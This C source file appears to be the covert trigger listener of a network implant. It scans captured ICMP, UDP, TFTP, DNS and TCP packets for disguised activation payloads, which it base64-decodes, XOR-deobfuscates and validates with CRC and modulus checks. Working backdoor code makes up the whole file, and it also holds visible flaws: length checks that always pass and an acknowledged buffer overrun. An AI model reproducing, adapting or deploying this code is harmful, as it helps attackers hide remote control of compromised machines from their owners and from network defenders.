#include <string.h>
#include <time.h>

#include "function_strings.h"
#include "compat.h"
#include "tiny_crc16.h"
#include "trigger_payload.h"
#include "trigger_listen.h"
#include "trigger_b64.h"
#include "debug.h"


/*!
 * \brief Check for triggers, entry/exit point into checking fo pkts
 *
 * @param pkt - packet
 * @param len - packet length
 * @param p - payload
 * @return
 * @retval SUCCESS (0)
 * @retval FAILURE (-1)
 */
int
dt_signature_check (unsigned char *pkt, int len, payload * p)
{
	uint8_t icmp_type;
	struct icmphdr_t *icmp_pkt = NULL;
	struct udphdr_t *udp_pkt = NULL;
	struct iphdr_t *ip_pkt = NULL;
	struct tcphdr_t *tcp_pkt = NULL;
	struct iphdr_t iphdr_temp;	/* In order to access the bit-fields on SPARC, because of memory alignment
	 	 	 	 	 requirements for accessing memory, we cannot just cast the struct iphdr_t
	 	 	 	 	 to the unsigned char *pkt.  Instead, we have to copy the ip header into a
	 	 	 	 	 separately allocated structure to ensure it is properly aligned when we attempt to access it. */

	//D (printf ("%s, %4d:\n", __FILE__, __LINE__); )
	if (len < 15 || pkt == NULL) {
		return FAILURE;
	}

	// get the start of the IP portion on the header
	if (pkt[12] == 0x8 && pkt[13] == 0x0) {
		// packet is considered to have a eth hdr if the proto
		// number 8(IP) is present at the correct offset

//              D(printf(" Packet has ethdhr\n");)

		ip_pkt = (struct iphdr_t *) ((char *) pkt + sizeof (struct ethhdr_t));
	}
	else if (pkt[0] == 0x45) {
		// no ethhdr, see if just IP
		// packet is considered IP if its 1st byte id 0x45,
		// this means IPv4 and standard 20 byte length

		D (printf ("%s, %4d: Packet does NOT have ethdhr\n", __FILE__, __LINE__); )
		ip_pkt = (struct iphdr_t *) pkt;
	}
	else {
		/// \todo add search for IP header code here!!! */
		//D (printf("%s, %4d: Packet IP header NOT found. Returning....\n", __FILE__, __LINE__); )
			return FAILURE;
	}

	// at this point, we have a good pointer to the start of the ip header
	//D (printf ("%s, %4d: Good IP header, protocol: %d\n", __FILE__, __LINE__, ip_pkt->protocol); )

	memcpy (&iphdr_temp, ip_pkt, sizeof (struct iphdr_t));

	if (ip_pkt->protocol == IPPROTO_ICMP) {
		// see notes for variable declaration of iphdr_temp as to why we do this memcpy()

		icmp_pkt = (struct icmphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);
		icmp_type = icmp_pkt->type;

#ifdef DEBUG
		printf ("\n********************************\n");
		printf (" ICMP Packet FOUND, type=%.2x code=%.2x, chksum=%.4x, id=%.4x, seq=%.4x\n", icmp_type, icmp_pkt->code, icmp_pkt->chksum, icmp_pkt->id, icmp_pkt->seq);
//    printf(" ICMP type at offset %d\n", ( (char*)icmp_pkt - (char*)ip_pkt) );
#endif

		switch (icmp_type) {
		case 0:	//reply
			return dt_ping_reply_received (icmp_pkt, p);
			break;

		case 8:	//request
			return dt_ping_request_received (icmp_pkt, p);
			break;

		case 3:	//error
			return dt_error_received (icmp_pkt, p);
			break;

		default:
			D (printf ("%s, %4d: Not a valid ICMP type, discarded\n", __FILE__, __LINE__); )
				return FAILURE;
			break;
		}

	}
	else if (ip_pkt->protocol == IPPROTO_UDP) {
		uint16_t pkt_length;
		uint16_t dport;

		udp_pkt = (struct udphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);		// Points to start of UDP packet
		pkt_length = ntohs(ip_pkt->tot_len) - sizeof(struct iphdr_t) - sizeof(struct udphdr_t); // Payload packet length = total length - headers

		// Check for raw UDP first, otherwise try TFTP and DNS
		if (pkt_length >= MIN_PACKET_SIZE || pkt_length <= MAX_PACKET_SIZE) // Only check packets that are within valid limits
			if (dt_raw_udp (udp_pkt, pkt_length, p) == SUCCESS)
				return SUCCESS;

		dport = ntohs(udp_pkt->dest);	// Convert destination port
		switch (dport) {

			case 69: // TFTP
				return dt_tftp_received (udp_pkt, p);
				break;

			case 53: // DNS
				return dt_dns_received (udp_pkt, p);
				break;

			default:
				break;
		}

	}
	else if (ip_pkt->protocol == IPPROTO_TCP) {
		uint16_t pkt_length;

		tcp_pkt = (struct tcphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);
		pkt_length = ntohs(iphdr_temp.tot_len) - (iphdr_temp.ihl * 4) - (tcp_pkt->tcphdrleng * 4);

		if (pkt_length >= MIN_PACKET_SIZE || pkt_length <= MAX_PACKET_SIZE) // Only check packets that are within valid limits
			return dt_raw_tcp (tcp_pkt, pkt_length, p);
	}
	else {
		return FAILURE;
	}

	return FAILURE;

}

/*!
 *  \brief ICMP error recevied
 * @param icmp - ICMP header
 * @param p - payload
 * @return Success(0) or Failure(-1)
 */
int
dt_error_received (struct icmphdr_t *icmp, payload * p)
{
	packet_ip_t *err_pkt;

	D (printf (" ERROR PKT FOUND\n"); )

	err_pkt = (packet_ip_t *) (((char *) icmp) + sizeof (struct icmphdr_t));

	/* grab the payload from the correct fields */
	memcpy (p, &((err_pkt->ip).id), 2);
	memcpy (((uint8_t *) p) + 2, &((err_pkt->ip).daddr), 4);
	memcpy (((uint8_t *) p) + 6, (uint8_t *) err_pkt->data, 2);
	memcpy (((uint8_t *) p) + 8, ((uint8_t *) err_pkt->data) + 4, 4);

	return(deobfuscate_payload (p));
}

//******************************************************************
int
dt_ping_reply_received (struct icmphdr_t *icmp, payload * p)
{

	int ping_index;
	static uint16_t reply_buffer[6];	// TODO: reply buffer is size 6, but below 12 bytes are set to zero
	uint16_t ping_seq;

#ifdef DEBUG

	printf (" PING REPLY FOUND\n");
	printf (" icmp-ID: %u\n", icmp->id);
	printf (" ntohs-seq: %u\n", ntohs (icmp->seq));

#endif

	ping_seq = ntohs (icmp->seq);
	ping_index = (ping_seq - 1) % 6;

	memcpy (&(reply_buffer[ping_index]),
		((uint8_t *) icmp) + sizeof (struct icmphdr_t) + 4,
		sizeof (uint16_t));

	// CRC the payload
	memcpy (p, reply_buffer, 12);
	return(deobfuscate_payload (p));
}

//******************************************************************
int
dt_ping_request_received (struct icmphdr_t *icmp, payload * p)
{
	int ping_index;
	int retval;
	static uint16_t pings_buffer[6];


	uint16_t ping_seq;

	//uint8_t payload_buf[12]; // for pings
#ifdef DEBUG
	printf (" PING REQUEST FOUND\n");

	printf (" icmp-ID: %u\n", icmp->id);

	printf (" ntohs-seq: %u\n", ntohs (icmp->seq));
#endif

	ping_seq = ntohs (icmp->seq);
	ping_index = (ping_seq - 1) % 6;

	memcpy (&(pings_buffer[ping_index]),
		((uint8_t *) icmp) + sizeof (struct icmphdr_t) + 4,
		sizeof (uint16_t));

	//debug_printhex(pings_buffer, 6);

	// CRC the payload
	memcpy (p, pings_buffer, 12);

#ifdef DEBUG
	{
		int i;

		printf ("\nPRE De-OBF\n");
		printf (" RAW BYTES: ");
		for (i = 0; i < (int) sizeof (payload); i++) {
			printf ("%2.2X ", ((uint8_t *) p)[i]);
		}
		printf ("\n");
	}
#endif

	retval = deobfuscate_payload (p);

#ifdef DEBUG
	{
		int i;

		printf ("\nPost De-OBF\n");
		printf ("--Package:");
		printf ("  seed: %2.2X", p->seed);
		printf ("  package: ");
		for (i = 0; i < 9; i++) {
			printf ("%2.2X ", (p->package)[i]);
		}
		printf ("  crc: 0x%4.4X", p->crc);
		printf ("\n--RAW BYTES:");
		for (i = 0; i < (int) sizeof (payload); i++) {
			printf ("0x%2.2X ", ((uint8_t *) p)[i]);
		}
		printf ("\n");
	}
#endif

	return retval;
}

//******************************************************************
int
dt_tftp_received (struct udphdr_t *udp, payload * p)
{

	char encoded_buffer[32];
	uint8_t decoded_buffer[32];
	int encode_length;
	int decode_length;
	int i;
	uint16_t tftp_opcode;
	char *tftp_start;

#ifdef DEBUG
	D (printf ("\n********************************\n"); )
	D (printf (" TFTP PKT FOUND\n"); )
#endif
		memset (encoded_buffer, 0, 32);
	memset (decoded_buffer, 0, 32);

	tftp_start = ((char *) udp) + sizeof (struct udphdr_t);

	memcpy (&tftp_opcode, tftp_start, sizeof (uint16_t));

	tftp_opcode = ntohs (tftp_opcode);

	if (tftp_opcode != TFTP_WRQ_OPCODE) {
#ifdef DEBUG
		printf (" op code not TFTP WRQ, failing. opcode:%d\n", tftp_opcode);
#endif
		return FAILURE;
	}

	strncpy (encoded_buffer, tftp_start + sizeof (uint16_t),
		 sizeof (encoded_buffer));

#ifdef DEBUG
	printf (" encoded string %s\n", encoded_buffer);
#endif

	encode_length = strlen (encoded_buffer);

#ifdef DEBUG
	printf (" encode length %d\n", encode_length);
#endif

	b64_decode_message ((uint8_t *) encoded_buffer,
			    decoded_buffer, encode_length, &decode_length);

	for (i = 0; i < decode_length; i++) {
		((char *) p)[i] = ((char *) decoded_buffer)[i];
	}

	return(deobfuscate_payload (p));
}

//******************************************************************
int
deobfuscate_payload (payload * p)
{
	int i;
	uint8_t *package;
	uint16_t crc;

	package = (uint8_t *)p;

	for (i = 1; i < (int) sizeof (payload); i++) {
		package[i] ^= package[0];		//deobfuscate with XOR of first byte
	}

	crc = ntohs(p->crc);
	p->crc = 0;
	if ( (tiny_crc16((uint8_t *)p, sizeof(payload)) == crc) && (crc != 0)) {

		p->crc = crc;		// Put CRC back in payload for debug display.
		return SUCCESS;
	}

	D (printf ("%s, %4d:\t CRC check failed. Payload CRC = 0x%0x\n", __FILE__, __LINE__, crc); )
	return FAILURE;
}


//******************************************************************
int
dt_dns_received (struct udphdr_t *udp, payload * p)
{

	char encoded_buffer[32];
	uint8_t decoded_buffer[32];
	int encode_length;
	int decode_length;
	int i;
	char *dns_start;
	unsigned char size_offset = 20;
	int domain_offset = size_offset + 1;

#ifdef DEBUG
	printf ("\n********************************\n");
	printf (" DNS PKT FOUND\n");
#endif

	memset (encoded_buffer, 0, 32);
	memset (decoded_buffer, 0, 32);

	encode_length = ((unsigned char *) udp)[size_offset];

	dns_start = ((char *) udp) + domain_offset;

	memcpy (encoded_buffer, dns_start, MIN (encode_length, 32));

#ifdef DEBUG
	printf (" encoded string %s\n", encoded_buffer);
	printf (" encode length %d\n", encode_length);
#endif

	b64_decode_message ((uint8_t *) encoded_buffer,
			    decoded_buffer, encode_length, &decode_length);


	if (decode_length > 32) {
		return FAILURE;
	}

	for (i = 0; i < decode_length; i++) {
		((char *) p)[i] = ((char *) decoded_buffer)[i];
	}

	return (deobfuscate_payload (p));
}

//******************************************************************
int
dt_raw_udp (struct udphdr_t *udp, uint16_t pktlen, payload * p)
{
	return raw_check ((char *) udp + sizeof (struct udphdr_t), pktlen, p);
}

//******************************************************************
int
dt_raw_tcp (struct tcphdr_t *tcp, uint16_t pktlen, payload * p)
{
	return raw_check ((char *) tcp + (tcp->tcphdrleng * 4), pktlen, p);
}

/*!
 * raw_check
 * @param incload	- Raw TCP payload pointer
 * @param pktlen	- Packet length
 * @param p		- Trigger payload pointer
 * @return
 * @retval SUCCESS (1)
 * @retval FAILURE (0)
 *
 * raw_check accepts a pointer to the raw TCP or UDP payload and returns
 * the trigger payload in the buffer pointed to by p.
 *
 */
int
raw_check (void *data, uint16_t pktlen, payload * p)
{
	uint16_t crc = 0;
	void *fieldPtr;		// Packet field pointer
	uint16_t uint16buf = 0;
	uint16_t netcrc;
	uint16_t validator;
	uint8_t *payloadKeyIndex;
	uint8_t *payloadIndex;
	int i;				// Loop counter
	uint8_t *pp;

	//////////////////////////////////////////////////////////////////////////////////////////////////////
	// NOTE: Memcpy is used in this function to prevent unaligned memory accesses in Sparc architectures.
	//////////////////////////////////////////////////////////////////////////////////////////////////////

	pp = (uint8_t *)p;
	// Compute the checksum of bytes between START_PAD and CRC.
	crc = tiny_crc16 ((unsigned char *) ((char *) data + START_PAD), CRC_DATA_LENGTH);
	// D (printf ("%s, %4d:\tComputed CRC: 0x%0x\n", __FILE__, __LINE__, crc); )

	// Get the CRC at the offset START_PAD + CRC_DATA_LENGTH + CRC % 200 into the packet.
	fieldPtr = data + START_PAD + CRC_DATA_LENGTH + (crc % 200);	// Set field pointer to the location of the CRC
	//D (printf ("%s, %4d:\tfieldPtr: 0x%p, data: 0x%p, offset: %d, packet length: %d\n", __FILE__, __LINE__, fieldPtr, data, fieldPtr - data, pktlen); )
	if (fieldPtr == 0 || (fieldPtr > (data + pktlen)))		// Make sure it's within bounds
		return FAILURE;

	//D (printf ("%s, %4d:\n", __FILE__, __LINE__); )
	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
	netcrc = ntohs(uint16buf);
	D (printf ("%s, %4d:\tCRC is at 0x%0x into data, CRC = 0x%0x\n", __FILE__, __LINE__, fieldPtr - data, netcrc); )

	if (crc != netcrc) {
		D (printf ("%s, %4d:\tCRC check failed\n", __FILE__, __LINE__); )
		return FAILURE;			// Check 1 failure: CRCs don't match
	}

	fieldPtr += sizeof(crc);
	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
	validator = ntohs(uint16buf);
	D (printf ("%s, %4d:\tValidator location: 0x%0x, Trigger validator = %d\n", __FILE__, __LINE__, fieldPtr - data, validator); )
	if ( (validator % 127) != 0) {
		D (printf ("%s, %4d:\tValidator check failed: validator = 0x%0x\n", __FILE__, __LINE__, validator); )
		return FAILURE;			// Check 2 failure: integer not divisible by 127
	}

	fieldPtr += sizeof(validator) + PAD1_LENGTH;		// Update field pointer to point to trigger payload.
	payloadIndex = fieldPtr;
	payloadKeyIndex = (uint8_t *)(data + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(payload))));	// Compute the start of the payload key
	D (printf ("%s, %4d:\tEncoded Payload offset\t0x%0x, Payload key offset: 0x%0x\tTrigger follows:\n", __FILE__, __LINE__, fieldPtr - data, payloadKeyIndex - (uint8_t *)data); )
	for (i = 0; i < (int)sizeof(payload); i++) {
		uint8_t trigger;

		trigger = payloadKeyIndex[i] ^ payloadIndex[i];			// XOR the trigger payload with the key
		D (printf ("\tByte[%2.2d]: encoded trigger = 0x%2.2x,  payloadKey= 0x%2.2x, decoded trigger = 0x%2.2x\n", i, payloadIndex[i], payloadKeyIndex[i], trigger); )
		memcpy((void *)(pp + i), (void *)&trigger, sizeof(uint8_t));
	}
	D (printf ("\n"); )
	return (deobfuscate_payload(p));
}
